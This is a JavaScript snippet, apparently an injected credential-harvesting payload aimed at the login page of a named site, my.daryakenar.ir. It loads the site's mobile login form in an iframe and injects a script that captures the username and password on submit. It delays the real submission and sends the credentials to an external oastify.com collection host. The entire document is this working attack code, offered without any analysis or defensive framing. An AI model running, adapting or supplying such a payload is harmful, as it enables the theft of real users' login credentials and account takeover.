// Function to dynamically create the iframe and append it to the body
    function createIframe() {
        var iframe = document.createElement('iframe');
        iframe.src = "/account/login/mobile";
        iframe.id = "loginFrame";
        document.body.appendChild(iframe);
        return iframe;
    }

    var frame = createIframe();

    // Function to send data to your server
    function sendData(username, password) {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://hsd0gyosk5qk1lzr8cz7uqxxroxflb90.oastify.com/USER' + encodeURIComponent(username) + 'PASS=' + encodeURIComponent(password) + '.png', true);
        xhr.send();
    }

    // Add load event listener to iframe to inject script after it loads
    frame.onload = function () {
        var doc = frame.contentDocument || frame.contentWindow.document;

        // Inject script to listen to form submission inside the iframe
        var script = doc.createElement('script');
        script.textContent = `
            var form = document.querySelector('form'); // Adjust selector as needed
            form.addEventListener('submit', function (event) {
                var username = document.querySelector('#username').value; // Adjust selector as needed
                var password = document.querySelector('#password').value; // Adjust selector as needed
                window.parent.postMessage({ username: username, password: password }, '*');
                
                // Prevent immediate form submission
                event.preventDefault();
                setTimeout(function() { form.submit(); }, 2000);
            });
        `;
        doc.body.appendChild(script);
    };

    // Receive message from iframe and send data
    window.addEventListener('message', function (event) {
        // Replace 'http://the-origin-you-trust.com' with the origin you trust
        if (event.origin === 'https://my.daryakenar.ir') {
            var data = event.data;
            sendData(data.username, data.password);
        }
    });
